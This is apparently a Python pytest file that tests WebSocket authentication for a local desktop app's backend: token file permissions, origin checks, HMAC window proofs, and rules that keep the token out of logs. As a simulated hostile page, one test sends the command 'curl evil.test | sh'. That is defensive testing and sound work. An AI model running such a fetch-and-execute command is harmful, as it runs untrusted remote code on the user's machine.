"""The credential that keeps a web page out of the local /ws socket.

The attack these guard against: a page the user happens to visit opens
``ws://127.0.0.1:<port>/ws`` — a WebSocket handshake is not subject to the
same-origin policy — scans until something answers, and sends ``terminal.create``
with a command of its choosing. Binding to loopback never stopped that; only a
secret the page cannot read does.
"""

from __future__ import annotations

import ast
import os
import pathlib
import stat

import pytest
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from agent_team_backend import app as app_module
from agent_team_backend import osplat
from agent_team_backend import ws_auth
from agent_team_backend.applog import backend_ws_token_file


@pytest.fixture(autouse=True)
def _isolated_token(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENT_TEAM_DATA_DIR", str(tmp_path))
    ws_auth._reset_for_test()
    yield
    ws_auth._reset_for_test()


# ---- the token file ----------------------------------------------------------


@pytest.mark.skipif(not osplat.paths.enforces_posix_modes(), reason="POSIX mode bits")
def test_the_token_file_is_owner_only(tmp_path) -> None:
    """The port file next to it is 0644 on purpose — a shell hook resolves it
    with `cat`. A secret must not inherit that."""
    ws_auth.issue_token()
    mode = stat.S_IMODE(os.stat(backend_ws_token_file()).st_mode)
    assert mode == 0o600, oct(mode)


@pytest.mark.skipif(not osplat.paths.enforces_posix_modes(), reason="POSIX mode bits")
def test_an_existing_file_does_not_keep_a_wider_mode(tmp_path) -> None:
    """O_CREAT leaves the mode of a file that already exists, so a run that
    inherited a world-readable token file would silently stay world-readable."""
    path = backend_ws_token_file()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("stale", encoding="utf-8")
    os.chmod(path, 0o644)
    ws_auth.issue_token()
    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600


def test_each_run_mints_a_new_token() -> None:
    """A token that outlived the process would be sitting in a file when the
    next one started, with nothing gained by keeping it."""
    first = ws_auth.issue_token()
    assert ws_auth.issue_token() != first


def test_the_token_on_disk_is_the_one_that_is_checked() -> None:
    token = ws_auth.issue_token()
    assert backend_ws_token_file().read_text(encoding="utf-8") == token
    assert ws_auth.check(token, "") == ""


# ---- the check ---------------------------------------------------------------


def test_no_token_is_refused() -> None:
    ws_auth.issue_token()
    assert ws_auth.check("", "") != ""


def test_a_wrong_token_is_refused() -> None:
    ws_auth.issue_token()
    assert ws_auth.check("not-the-token", "") != ""


def test_a_backend_with_no_token_refuses_everyone() -> None:
    """Fail closed. The alternative — treating "no token yet" as "allow" —
    would leave a window at startup where the socket is open to anyone."""
    ws_auth._reset_for_test("")
    assert ws_auth.check("anything", "") != ""


@pytest.mark.parametrize("origin", ["https://evil.example", "http://attacker.test:8080"])
def test_a_web_origin_is_refused_even_with_a_valid_token(origin) -> None:
    """Second line of defence: a page that somehow learned the token still
    announces itself, because the browser sets Origin and script cannot."""
    token = ws_auth.issue_token()
    assert ws_auth.check(token, origin) != ""


@pytest.mark.parametrize(
    "origin", ["", "file://", "http://localhost:5174", "http://127.0.0.1:5174"]
)
def test_the_origins_our_own_clients_send_are_allowed(origin) -> None:
    """Electron sends file:// when packaged and the dev server origin when not;
    non-browser clients send nothing. Guessing wrong here would look like "the
    backend will not start", which is why the token is the real gate."""
    token = ws_auth.issue_token()
    assert ws_auth.check(token, origin) == ""


# ---- invariants that keep the token out of the places a 0600 file protects ----


def test_the_server_does_not_log_every_request() -> None:
    """The token rides in the query string, which is the normal way to
    authenticate a WebSocket — a browser handshake cannot set a custom header.
    That is fine only while nothing writes request URLs to a log: uvicorn's
    access log would put a secret protected by a 0600 file into a 0644 one.

    Pinned as a test because the tempting thing to do while debugging is to
    turn the access log on, and nothing else would object.
    """
    main = (
        pathlib.Path(__file__).resolve().parents[1] / "agent_team_backend" / "__main__.py"
    ).read_text(encoding="utf-8")
    # Parsed rather than grepped: a substring check passes for a file that sets
    # access_log=True and mentions the false spelling in a comment beside it.
    tree = ast.parse(main)
    settings = [
        keyword
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        for keyword in node.keywords
        if keyword.arg == "access_log"
    ]
    assert settings, "nothing sets access_log at all — the default is on"
    for keyword in settings:
        assert isinstance(keyword.value, ast.Constant) and keyword.value.value is False


def test_the_main_process_does_not_print_the_ws_url() -> None:
    """The same secret, on the other side of the handoff. The URL Electron
    builds carries the token, so logging it anywhere — a console.log left in
    after a debugging session — spills it into the terminal and any log the
    user pastes into a bug report."""
    root = pathlib.Path(__file__).resolve().parents[2]
    offenders = []
    scanned = 0
    for path in (root / "src" / "main").rglob("*.ts"):
        scanned += 1
        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if "console." in line and ("wsUrl" in line or "readWsToken" in line):
                offenders.append(f"{path.relative_to(root)}:{number}")
    # Without this the test is the very failure it exists to prevent: move
    # src/main, or change this file's depth in the tree, and rglob yields
    # nothing, offenders stays empty, the test passes, and the invariant is no
    # longer guarded by anything. Silent loss of protection with nothing broken
    # to notice — the same shape as an in-memory pin that a restart forgets.
    assert scanned > 0, "scanned no files, so this invariant is no longer guarded"
    assert offenders == [], f"the ws token would be logged at: {offenders}"


# ---- the endpoint ------------------------------------------------------------


@pytest.fixture(scope="module")
def client():
    """One client for the whole module, and deliberately not a context manager.

    Two traps here, both of which only appear in a full-suite run:

    ``with TestClient(...)`` runs the app's lifespan, and this app's shutdown
    event closes the shared SQLite connection. Doing that at the end of this
    module leaves every later test in the session hitting "Cannot operate on a
    closed database" — a failure that points at those tests and says nothing
    about this file.

    A second TestClient in the same module binds the app's module-level asyncio
    primitives to a second event loop, and everything after dies with "bound to
    a different event loop". Hence module scope rather than per test.

    ``websocket_connect`` does not need the lifespan; it runs on its own portal.
    """
    # base_url pinned to loopback: the default "testserver" Host is exactly
    # what reject_foreign_host refuses.
    return TestClient(app_module.app, base_url="http://127.0.0.1")


def test_a_page_without_the_token_never_reaches_the_dispatch_loop(client) -> None:
    """The attack, end to end: no credential, so terminal.create is never read."""
    ws_auth.issue_token()
    with pytest.raises(WebSocketDisconnect) as err:
        with client.websocket_connect("/ws") as ws:
            ws.send_json(
                {
                    "id": "x",
                    "type": "terminal.create",
                    "payload": {"command": "curl evil.test | sh"},
                }
            )
            ws.receive_json()
    assert err.value.code == ws_auth.WS_UNAUTHORIZED


def test_a_page_with_a_web_origin_is_refused(client) -> None:
    token = ws_auth.issue_token()
    with pytest.raises(WebSocketDisconnect) as err:
        with client.websocket_connect(
            f"/ws?t={token}", headers={"origin": "https://evil.example"}
        ) as ws:
            ws.receive_json()
    assert err.value.code == ws_auth.WS_UNAUTHORIZED


def test_a_client_holding_the_token_is_let_through(client) -> None:
    """The other half: the fix must not lock out the app itself."""
    token = ws_auth.issue_token()
    with client.websocket_connect(f"/ws?t={token}") as ws:
        ws.send_json({"id": "p1", "type": "ping", "payload": {}})
        reply = ws.receive_json()
        while reply.get("id") != "p1":
            reply = ws.receive_json()
        assert reply.get("ok") is True


# ---- which client is a Navide window -------------------------------------------


# HMAC-SHA256("host-secret", "navide-window/v2\0nonce-1"), pinned on both sides.
WINDOW_PROOF_VECTOR = "a4c453f892421e367a36312ee518ccbca38a442e010fc441ed351d433ec3d0f6"


def _window_proof(host_token: str, nonce: str) -> str:
    """What Electron main answers backend:proveWindow with for one of its main
    windows: src/main/backend.ts proveWindow. Recomputed here rather than
    imported so the two languages are checked against each other."""
    import hashlib
    import hmac

    return hmac.new(host_token.encode(), b"navide-window/v2\0" + nonce.encode(), hashlib.sha256).hexdigest()


def _welcome(ws) -> str:
    """The challenge the backend sends first on every connection."""
    while True:
        msg = ws.receive_json()
        if msg.get("type") == "ws.welcome":
            return msg["payload"]["windowChallenge"]


def _prove(ws, msg_id: str, proof: str) -> dict:
    ws.send_json({"id": msg_id, "type": "window.prove", "payload": {"proof": proof}})
    while True:
        reply = ws.receive_json()
        if reply.get("id") == msg_id:
            return reply


def _new_session(before: set):
    (session,) = set(app_module._SESSIONS) - before
    return session


def test_every_connection_gets_a_fresh_window_challenge(client, monkeypatch) -> None:
    """R3-M2: the old proof was a static HMAC in the URL, replayable by
    anything that once read it. Each connection now gets its own nonce."""
    monkeypatch.setattr(app_module, "_HOST_SESSION_TOKEN", "host-secret")
    token = ws_auth.issue_token()
    with client.websocket_connect(f"/ws?t={token}") as ws:
        first = _welcome(ws)
    with client.websocket_connect(f"/ws?t={token}") as ws:
        second = _welcome(ws)
    assert len(first) == 64 and len(second) == 64
    assert first != second


def test_the_right_proof_makes_a_navide_window_once(client, monkeypatch) -> None:
    monkeypatch.setattr(app_module, "_HOST_SESSION_TOKEN", "host-secret")
    token = ws_auth.issue_token()
    before = set(app_module._SESSIONS)
    with client.websocket_connect(f"/ws?t={token}") as ws:
        nonce = _welcome(ws)
        session = _new_session(before)
        assert session.navide_window is False
        proof = _window_proof("host-secret", nonce)
        assert _prove(ws, "p1", proof).get("ok") is True
        assert session.navide_window is True
        # Accepted once: the same proof again is refused, and changes nothing.
        assert _prove(ws, "p2", proof).get("ok") is False
        assert session.navide_window is True


@pytest.mark.parametrize("wrong", ["bad-key", "other-nonce", "empty", "not-a-string", "non-ascii"])
def test_a_wrong_proof_is_refused(client, monkeypatch, wrong) -> None:
    """Refused without spending the challenge: a proof meant for the previous
    socket can land on a fresh one during a reconnect, and must not lock that
    window out. Guessing an HMAC-SHA256 is not a budget worth rationing."""
    monkeypatch.setattr(app_module, "_HOST_SESSION_TOKEN", "host-secret")
    token = ws_auth.issue_token()
    before = set(app_module._SESSIONS)
    with client.websocket_connect(f"/ws?t={token}") as ws:
        nonce = _welcome(ws)
        session = _new_session(before)
        bad = {
            "bad-key": _window_proof("other", nonce),
            "other-nonce": _window_proof("host-secret", "a" * 64),
            "empty": "",
            "not-a-string": 7,
            "non-ascii": "é" * 64,
        }[wrong]
        assert _prove(ws, "p1", bad).get("ok") is False
        assert session.navide_window is False
        assert _prove(ws, "p2", _window_proof("host-secret", nonce)).get("ok") is True
        assert session.navide_window is True


def test_a_non_ascii_proof_or_host_token_is_refused_not_raised(monkeypatch) -> None:
    """R4-L1: compare_digest raises TypeError on a str with non-ASCII
    characters; a client must get a refusal, never a traceback."""
    monkeypatch.setattr(app_module, "_HOST_SESSION_TOKEN", "host-secret")
    assert app_module.navide_window_proof_matches("a" * 64, "é" * 64) is False
    assert app_module.host_session_token_matches("hést-secret") is False
    assert app_module.host_session_token_matches("host-secret") is True


def test_a_proof_replayed_on_another_connection_is_refused(client, monkeypatch) -> None:
    """What a sniffed or logged proof buys: nothing on any other connection."""
    monkeypatch.setattr(app_module, "_HOST_SESSION_TOKEN", "host-secret")
    token = ws_auth.issue_token()
    with client.websocket_connect(f"/ws?t={token}") as ws:
        stolen = _window_proof("host-secret", _welcome(ws))
        assert _prove(ws, "p1", stolen).get("ok") is True
    before = set(app_module._SESSIONS)
    with client.websocket_connect(f"/ws?t={token}") as ws:
        _welcome(ws)
        session = _new_session(before)
        assert _prove(ws, "p1", stolen).get("ok") is False
        assert session.navide_window is False


def test_the_old_url_proof_no_longer_counts(client, monkeypatch) -> None:
    import hashlib
    import hmac

    monkeypatch.setattr(app_module, "_HOST_SESSION_TOKEN", "host-secret")
    static = hmac.new(b"host-secret", b"navide-window", hashlib.sha256).hexdigest()
    token = ws_auth.issue_token()
    before = set(app_module._SESSIONS)
    with client.websocket_connect(f"/ws?t={token}&w={static}") as ws:
        _welcome(ws)
        assert _new_session(before).navide_window is False


def test_without_a_host_token_no_client_counts_as_a_navide_window(client, monkeypatch) -> None:
    monkeypatch.setattr(app_module, "_HOST_SESSION_TOKEN", "")
    token = ws_auth.issue_token()
    before = set(app_module._SESSIONS)
    with client.websocket_connect(f"/ws?t={token}") as ws:
        nonce = _welcome(ws)
        session = _new_session(before)
        assert _prove(ws, "p1", _window_proof("", nonce)).get("ok") is False
        assert session.navide_window is False


def test_the_window_proof_matches_the_vector_main_computes() -> None:
    """src/main/backend.test.ts pins the same value for proveWindow."""
    assert _window_proof("host-secret", "nonce-1") == WINDOW_PROOF_VECTOR
